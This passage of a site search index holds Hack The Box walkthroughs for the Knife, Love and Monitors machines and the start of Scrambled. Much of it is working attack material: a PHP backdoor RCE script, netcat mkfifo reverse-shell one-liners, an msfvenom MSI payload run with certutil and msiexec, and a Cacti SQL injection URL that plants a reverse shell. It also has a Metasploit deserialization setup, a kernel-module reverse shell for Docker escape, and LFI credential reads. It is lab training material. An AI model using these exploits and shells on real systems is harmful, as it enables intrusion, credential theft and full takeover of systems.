AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=\n|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=\n|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb\n80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))\n| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title:  Emergent Medical Idea\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"Writeups/machines/knife/knife-writeup/#enumerate-web-service","title":"Enumerate Web Service","text":"<p>By looking into the network tap in Firefox developer mode, we will find that the web service is running <code>PHP</code> version <code>8.1.0</code>, which is vulnerable to Remote Code Execution.</p> <p></p>"},{"location":"Writeups/machines/knife/knife-writeup/#initial-foothold","title":"Initial Foothold","text":""},{"location":"Writeups/machines/knife/knife-writeup/#php-810-remote-code-execution","title":"PHP 8.1.0 Remote Code Execution","text":"<p>Exploit link: https://github.com/flast101/php-8.1.0-dev-backdoor-rce</p> <pre><code>#!/usr/bin/env python3\nimport os\nimport re\nimport requests\n\nhost = input(\"Enter the full host url:\\n\")\nrequest = requests.Session()\nresponse = request.get(host)\n\nif str(response) == '&lt;Response [200]&gt;':\n    print(\"\\nInteractive shell is opened on\", host, \"\\nCan't access tty; job crontol turned off.\")\n    try:\n        while 1:\n            cmd = input(\"$ \")\n            headers = {\n            \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\",\n            \"User-Agentt\": \"zerodiumsystem('\" + cmd + \"');\"\n            }\n            response = request.get(host, headers = headers, allow_redirects = False)\n            current_page = response.text\n            stdout = current_page.split('&lt;!DOCTYPE html&gt;',1)\n            text = print(stdout[0])\n    except KeyboardInterrupt:\n        print(\"Exiting...\")\n        exit\n\nelse:\n    print(\"\\r\")\n    print(response)\n    print(\"Host is not available, aborting...\")\n    exit\n</code></pre> <p>To get RCE, just run the script and specify target URL</p> <pre><code>\u039e knife/scripts \u2192 python3 php-8.1.0-rce.py\nEnter the full host url:\nhttp://10.10.10.242\n\nInteractive shell is opened on http://10.10.10.242 \nCan't access tty; job crontol turned off.\n$ id\nuid=1000(james) gid=1000(james) groups=1000(james)\n</code></pre> <p>No we got user access into the machine. </p>"},{"location":"Writeups/machines/knife/knife-writeup/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Writeups/machines/knife/knife-writeup/#upgrade-shell","title":"Upgrade Shell","text":"<p>Firstly, let's upgrade our shell using the following command: </p> <ul> <li>In local machine run netcat listener</li> </ul> <pre><code>nc -nlvp 9002\n</code></pre> <ul> <li>In target run the following command and change the IP</li> </ul> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.x 9002 &gt;/tmp/f\n</code></pre> <ul> <li>You will receive reverse shell back, now upgrade into into interactive shell </li> </ul> <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <p></p>"},{"location":"Writeups/machines/knife/knife-writeup/#enumerate-the-target-machine","title":"Enumerate The Target Machine","text":"<p>First, let's check user binaries that he can run as root</p> <pre><code>$ james@knife:/$ sudo -l \nsudo -l \nMatching Defaults entries for james on knife:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser james may run the following commands on knife:\n    (root) NOPASSWD: /usr/bin/knife\n</code></pre> <p>So we found that user <code>james</code> can run the binary <code>/usr/bin/knife</code> as root. Let's check what is the content of the binary <code>/usr/bin/knife</code></p> <pre><code>#!/opt/chef-workstation/embedded/bin/ruby --disable-gems\n#--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1--\nrequire \"rubygems\"\n\n...\n\nKernel.load(bin_file)\n</code></pre> <p>By looking into the script it seems like it runs <code>Ruby</code> as root privileges. </p> <p>So we can now run any <code>Ruby</code> script as root, we can abuse that by reading <code>root.txt</code> file </p>"},{"location":"Writeups/machines/knife/knife-writeup/#reading-roottxt-file","title":"Reading <code>root.txt</code> File","text":"<p>Firstly, I created to following <code>Ruby</code> script:</p> <pre><code>File.open(\"/root/root.txt\", \"r\") do |f|\nf.each_line do |line|\nputs line\nend\nend\n</code></pre> <p>The script reads <code>/root/root.txt</code> file, now we will send it into the target machine and run the following command in order to read root flag: </p> <pre><code>bash-5.0$ sudo /usr/bin/knife exec root.rb\nsudo /usr/bin/knife exec root.rb\n7a7f71--------5211a360d\n</code></pre> <p></p>"},{"location":"Writeups/machines/love/love/","title":"Walkthrough","text":""},{"location":"Writeups/machines/love/love/#attack-scenario-diagram","title":"Attack Scenario Diagram","text":""},{"location":"Writeups/machines/love/love/#recon","title":"Recon","text":""},{"location":"Writeups/machines/love/love/#nmap","title":"nmap","text":"<pre><code>~/tmp/htb/exploit\nnmap 10.10.10.239 -sC -sV                       \nStarting Nmap 7.80 ( https://nmap.org ) at 2021-05-02 09:46 +04\nNmap scan report for 10.10.10.239\nHost is up (0.43s latency).\nNot shown: 993 closed ports\nPORT     STATE SERVICE      VERSION\n80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)\n| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: Voting System using PHP\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: 403 Forbidden\n| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in\n| Not valid before: 2021-01-18T14:00:16\n|_Not valid after:  2022-01-18T14:00:16\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: |_  http/1.1\n445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)\n3306/tcp open  mysql?\n| fingerprint-strings: |   NULL: |_    Host '10.10.14.23' is not allowed to connect to this MariaDB server\n5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: 403 Forbidden\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3306-TCP:V=7.80%I=7%D=5/2%Time=608E3CB1%P=x86_64-pc-linux-gnu%r(NUL\nSF:L,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.23'\\x20is\\x20not\\x20allowe\nSF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");\nService Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>From <code>nmap</code> we found new sub-domain: <code>staing.love.htb</code> </p>"},{"location":"Writeups/machines/love/love/#web-enumeration","title":"Web Enumeration","text":""},{"location":"Writeups/machines/love/love/#staginglovehtb","title":"staging.love.htb","text":"<p>We found a web page that scans files be passing URLs at <code>http://staging.love.htb/beta.php</code> from it I was able to read local host service <code>http://127.0.0.1:5000</code> , after reading the file source code I was able to obtain admin login credentials: </p> <p></p> <p><code>admin:@LoveIsInTheAir!!!!</code> </p> <p>Then used the credentials to login to the main web page  </p>"},{"location":"Writeups/machines/love/love/#lovehtb","title":"love.htb","text":"<p>Found that the website is running <code>Voting System</code> </p>"},{"location":"Writeups/machines/love/love/#exploitation","title":"Exploitation","text":""},{"location":"Writeups/machines/love/love/#file-upload-rce","title":"File Upload RCE","text":"<p>link: https://www.exploit-db.com/exploits/49445</p> <p>Exploit: </p> <pre><code>...\n# --- Edit your settings here ----\nIP = \"10.10.10.239\" # Website's URL\nUSERNAME = \"admin\" #Auth username\nPASSWORD = \"@LoveIsInTheAir!!!!\" # Auth Password\nREV_IP = \"10.10.14.x\" # Reverse shell IP\nREV_PORT = \"9001\" # Reverse port \n# --------------------------------\n...\n</code></pre> <p></p>"},{"location":"Writeups/machines/love/love/#post-exploitation","title":"Post Exploitation","text":"<p>After gaining access into the box as <code>phoebe</code> user we can read <code>user.txt</code> flag.</p> <pre><code>C:\\Users\\Phoebe\\Desktop&gt;more user.txt\nmore user.txt\n6c1971cf2a4dfdb4684c14cf8246e129\n</code></pre>"},{"location":"Writeups/machines/love/love/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Writeups/machines/love/love/#winpeas","title":"Winpeas","text":"<p>First of all, I uploaded <code>winpeas</code> into the target machine and run it. And found interesting output. </p> <p><code>....   [+] Checking AlwaysInstallElevated    [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated     AlwaysInstallElevated set to 1 in HKLM!     AlwaysInstallElevated set to 1 in HKCU! ...</code></p>"},{"location":"Writeups/machines/love/love/#always-install-elevated","title":"Always Install Elevated","text":"<p>When checking user privileges, we will found that the user have <code>SeChangeNotifyPrivilege</code> </p> <pre><code>c:\\Windows\\Temp&gt;whoami /priv\nwhoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                          State   ============================= ==================================== ========\nSeShutdownPrivilege           Shut down the system                 Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled SeUndockPrivilege             Remove computer from docking station Disabled\nSeIncreaseWorkingSetPrivilege Increase a process working set       Disabled\nSeTimeZonePrivilege           Change the time zone                 Disabled\n\nc:\\Windows\\Temp&gt;\n</code></pre> <p>Furthermore, from <code>Winpeas</code> we Identified that the user also having <code>Always Install Evevated</code> privileges so we can abuse it to escluate our privileges. </p> <p>See the following link: https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated</p> Exploitation Process <ul> <li>Generate a reverse shell payload using <code>msfvenom</code> </li> </ul> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=9002 -f msi -o reverse.msi\n</code></pre> <ul> <li> <p>Upload it to the target machine</p> </li> <li> <p>Local</p> <pre><code>python3 -m http.server 8888\n</code></pre> </li> <li> <p>Target</p> <pre><code>certutil -urlcache -f http://10.10.14.x:8888/reverse.msi reverse.msi\n</code></pre> </li> <li> <p>Open netcat listener in your local machine</p> </li> </ul> <pre><code>nc -nlvp 9002\n</code></pre> <ul> <li>Exec the uploaded payload using <code>msiexec</code> </li> </ul> <pre><code>msiexec /quiet /qn /i reverse.msi\n</code></pre> <p>After execution we will receive remote connection back as administrator. </p> <pre><code>nc -nlvp 9002 \nlistening on [any] 9002 ...\nconnect to [10.10.14.23] from (UNKNOWN) [10.10.10.239] 54407\nMicrosoft Windows [Version 10.0.19042.928]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\WINDOWS\\system32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre> <p>The box is pwned! now we can read <code>root.flag</code> and submit it. </p>"},{"location":"Writeups/machines/monitors/monitors/","title":"Monitors Walkthrough","text":""},{"location":"Writeups/machines/monitors/monitors/#overview","title":"Overview","text":""},{"location":"Writeups/machines/monitors/monitors/#machine-info","title":"Machine Info","text":"IP Difficulty OS 10.10.10.238 Hard Linux"},{"location":"Writeups/machines/monitors/monitors/#recon","title":"Recon","text":""},{"location":"Writeups/machines/monitors/monitors/#nmap","title":"NMAP","text":"<pre><code>\u039e monitors/notes \u2192 nmap  10.10.10.238                       \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 13:10 EDT\nNmap scan report for 10.10.10.238\nHost is up (0.25s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n</code></pre>"},{"location":"Writeups/machines/monitors/monitors/#enumeration","title":"Enumeration","text":""},{"location":"Writeups/machines/monitors/monitors/#wordpress-plugin-wp-with-spritz-10-remote-file-inclusion","title":"WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion","text":"<p>Exploit</p> <pre><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd\n</code></pre> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nmarcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash\nDebian-snmp:x:112:115::/var/lib/snmp:/bin/false\nmysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre> <p><code>wp-config.php</code> content:</p> <pre><code>&lt;?php\n.....\n\ndefine( 'DB_USER', 'wpadmin' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'BestAdministrator@2020!' );\n.....\n</code></pre> <p>Reading <code>php logs</code> </p> <pre><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/proc/self/fd/10\n</code></pre> <p>we will find a new subdomain: <code>cacti-admin.monitors.htb</code></p>"},{"location":"Writeups/machines/monitors/monitors/#exploitation","title":"Exploitation","text":""},{"location":"Writeups/machines/monitors/monitors/#sqli-in-cacti-cms","title":"SQLi in Cacti CMS","text":"<p>First of all login into Cacti CMS with credentials: <code>admin:BestAdministrator@2020!</code> </p> <p>After Researching, found that Cacti is vulnerable to SQLi. See the following link: https://github.com/Cacti/cacti/issues/3622</p> <p>We can exploit it by typing the following into the URL: </p> <pre><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;header=false&amp;filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.x+9001+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-\n</code></pre> <p>Run netcat listener in local machine with port 9001: </p> <pre><code>nc -nlvp 9001\n</code></pre> <p>Then enter: </p> <pre><code>http://cacti-admin.monitors.htb/cacti/host.php?action=reindex&amp;host_id=1\n</code></pre> <p>You will receive reverse shell as user <code>www-data</code>: </p> <pre><code>nnc -nvlp 9001\nlistening on [any] 9001 ...\nconnect to [10.10.14.x] from (UNKNOWN) [10.10.10.238] 56312\nwww-data@monitors:/usr/share/cacti/cacti$\n</code></pre>"},{"location":"Writeups/machines/monitors/monitors/#pivot-to-marcus","title":"Pivot to Marcus","text":"<pre><code>ww-data@monitors:/etc$ cat /etc/systemd/system/cacti-backup.service\ncat /etc/systemd/system/cacti-backup.service\n...\nExecStart=/home/marcus/.backup/backup.sh\n...\n\nwww-data@monitors:/etc$ cat /home/marcus/.backup/backup.sh\ncat /home/marcus/.backup/backup.sh\n#!/bin/bash\n\nbackup_name=\"cacti_backup\"\nconfig_pass=\"VerticalEdge2020\"\n...\n</code></pre> <p><code>marcus:VerticalEdge2020</code> </p> <p>SSH into the target as Marcus </p> <pre><code>ssh -l marcus 10.10.10.238\n</code></pre>"},{"location":"Writeups/machines/monitors/monitors/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Writeups/machines/monitors/monitors/#enumerating","title":"Enumerating","text":"<p>While inside docker container, I saw one local service running at localhost port 8443. </p> <pre><code>marcus@monitors:~$ netstat -tulpn \nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      -                   \nudp        0      0 0.0.0.0:41695           0.0.0.0:*                           -                   \nudp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   \nudp        0      0 127.0.0.1:161           0.0.0.0:*                           - </code></pre>"},{"location":"Writeups/machines/monitors/monitors/#port-forward","title":"Port Forward","text":"<p>In order to access the local service, use SSH port forward using the following command: </p> <pre><code>ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb\n</code></pre> <p>Now we can access local service in our local machine at <code>127.0.0.1:8443</code> </p> <p></p>"},{"location":"Writeups/machines/monitors/monitors/#exploiting-tomcat-9031","title":"Exploiting Tomcat 9.0.31","text":"<p>We identified that service is running <code>Tomcat 9.0.31</code>, which is vulnerable to <code>RCE in Apache OFBiz XMLRPC via Deserialization of Untrusted Data (CVE-2020-9496)</code>. </p> <p>We can exploit it using Metasploit: </p> <pre><code>use exploit/linux/http/apache_ofbiz_deserialiation\nset payload linux/x64/shell_reverse_tcp\nset rhosts 127.0.0.1\nset lport 8443\nset forceexploit true\nset lhost tun0\nset srvhost tun0\nexploit\n</code></pre> <p>Then we will get RCE inside docker container:</p>"},{"location":"Writeups/machines/monitors/monitors/#escaping-docker-container","title":"Escaping Docker Container","text":"<p>We can escape docker container by abusing <code>SYS_MODULE</code> capability. See the following link: </p> <p>https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd</p> <p>To exploit it, follow these steps </p> <ul> <li>Create file <code>reverse-shell.c</code>: </li> </ul> <pre><code>#include &lt;linux/kmod.h&gt;\n#include &lt;linux/module.h&gt;\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"AttackDefense\");\nMODULE_DESCRIPTION(\"LKM reverse shell module\");\nMODULE_VERSION(\"1.0\");\nchar* argv[] = {\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/10.10.10.238/1234 0&gt;&amp;1\", NULL};\nstatic char* envp[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL };\nstatic int __init reverse_shell_init(void) {\nreturn call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n}\nstatic void __exit reverse_shell_exit(void) {\nprintk(KERN_INFO \"Exiting\\n\");\n}\nmodule_init(reverse_shell_init);\nmodule_exit(reverse_shell_exit);\n</code></pre> <ul> <li>Create file <code>Makefile</code>: </li> </ul> <pre><code>obj-m +=reverse-shell.o\nall:\nmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\nclean:\nmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n</code></pre> <ul> <li> <p>Transfer them into the target machine: </p> </li> <li> <p>Local</p> <pre><code>python3 -m http.server 8002\n</code></pre> </li> <li> <p>Target </p> <pre><code>wget http://10.10.14.x:8002/reverse-shell.c\nwget http://10.10.14.x:8002/Makefile\n</code></pre> </li> </ul> <p>Make sure to create folder in <code>/tmp</code> folder, and save those files inside that folder, ex: <code>/tmp/exploit/reverse-shell.c</code></p> <ul> <li>Compile the exploit using <code>make</code> command</li> </ul> <pre><code>root@84e75d9a2984:/tmp/reversenotshell# make\nmake\nmake -C /lib/modules/4.15.0-142-generic/build M=/tmp/reversenotshell modules\nmake[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'\nCC [M]  /tmp/reversenotshell/reverse-shell.o\n  Building modules, stage 2.\n  MODPOST 1 modules\n  CC      /tmp/reversenotshell/reverse-shell.mod.o\n  LD [M]  /tmp/reversenotshell/reverse-shell.ko\nmake[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'\n</code></pre> <ul> <li>Inside the target machine open netcat listener</li> </ul> <pre><code>nc -nlvp 1234\n</code></pre> <ul> <li>Finally run the following command: </li> </ul> <pre><code>root@84e75d9a2984:/tmp/reversenotshell# insmod reverse-shell.ko\ninsmod reverse-shell.ko\n</code></pre> <p>You will receive shell as root use in the target machine</p> <pre><code>marcus@monitors:/tmp$ nc -nlvp 4455\nListening on [0.0.0.0] (family 0, port 4455)\nConnection from 10.10.10.238 45176 received!\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@monitors:/# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"Writeups/machines/scrambled/writeup/","title":"Writeup","text":""},{"location":"Writeups/machines/scrambled/writeup/#overview","title":"Overview","text":"<p>Scrambled machine was a Domain Controller which attracted me to walk through it. The attack scenario was interesting where it starts from hunting for domain users, pivoting into service accounts, .NET source code review and exploiting application using deserialization vulnerability. The box contains multiple pivoting points to reach the Domain Admin. However, I did not like that the NTLM authentication is disabled in the box, I had multiple issues while using Impacket's tools that took me time to solve those issues. In this blog, I'll demonstrate the attack scenario to Pwn this box with the help of PoshC2 framework. PoshC2 is very powerful tool for red teamers and can be customizable. However, because of the box doesn't have AV solution, I'll use the default profile/configuration of PoshC2. </p>"},{"location":"Writeups/machines/scrambled/writeup/#machine-info","title":"Machine Info","text":"Operating System Difficulty IP Windows Medium 10.10.11.168"},{"location":"Writeups/machines/scrambled/writeup/#walkthrough","title":"Walkthrough","text":""},{"location":"Writeups/machines/scrambled/writeup/#attack-scenario-diagram","title":"Attack Scenario Diagram","text":""},{"location":"Writeups/machines/scrambled/writeup/#recon","title":"Recon","text":""},{"location":"Writeups/machines/scrambled/writeup/#nmap","title":"nmap","text":"<pre><code>PORT     STATE SERVICE       REASON  VERSION\n53/tcp   open  domain        syn-ack Simple DNS Plus\n80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0\n| http-methods: |   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Scramble Corp Intranet\n88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-07-15 08:40:57Z)\n135/tcp  open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm\n445/tcp  open  microsoft-ds? syn-ack\n464/tcp  open  kpasswd5?     syn-ack\n593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm\n1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM\n3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm\n3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm\nService Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 0s, deviation: 0s, median: 0s\n| ms-sql-info: |   10.10.11.168:1433: |     Version: |       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| p2p-conficker: |   Checking for Conficker.C or higher...\n|   Check 1 (port 42300/tcp): CLEAN (Timeout)\n|   Check 2 (port 40536/tcp): CLEAN (Timeout)\n|   Check 3 (port 9648/udp): CLEAN (Timeout)\n|   Check 4 (port 31813/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-security-mode: |   2.02: |_    Message signing enabled and required\n| smb2-time: |   date: 2022-07-15T08:41:43\n|_  start_date: N/A\n</code></pre> <p>By looking into <code>nmap</code> scan results, the ports 53, 389 and 636 are opened this indicates that the host is Domain Controller. Furthermore, the Domain Name is <code>scrm.local</code> and the hostname is <code>DC1.scrm.local</code> we have to add it to our hosts file. Another useful information from <code>nmap</code> results we identified that the port 1433 is open which represent <code>MSSQL</code> service. </p>"},{"location":"Writeups/machines/scrambled/writeup/#web-enumeration","title":"Web Enumeration","text":"<p>Going through the web page <code>/support.html</code> we will notice an alert which stats the following message:</p> <p></p> <p>Below the alert message, there is several web pages we can look into. By navigating into <code>/salesorders.html</code> web page, we will notice a guidance of using Sales Orders App. From the guidance we can see a new port which is 4411. </p> <p></p> <p>Running <code>nmap</code> will give us the following results. Nothing interesting beside that the port is open. </p> <pre><code>nmap 10.10.11.168 -sC -sV -vv -p 4411\nPORT     STATE SERVICE REASON  VERSION\n4411/tcp open  found?  syn-ack\n| fingerprint-strings: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: |     SCRAMBLECORP_ORDERS_V1.0.3;\n|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: |     SCRAMBLECORP_ORDERS_V1.0.3;\n|_    ERROR_UNKNOWN_COMMAND;\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service 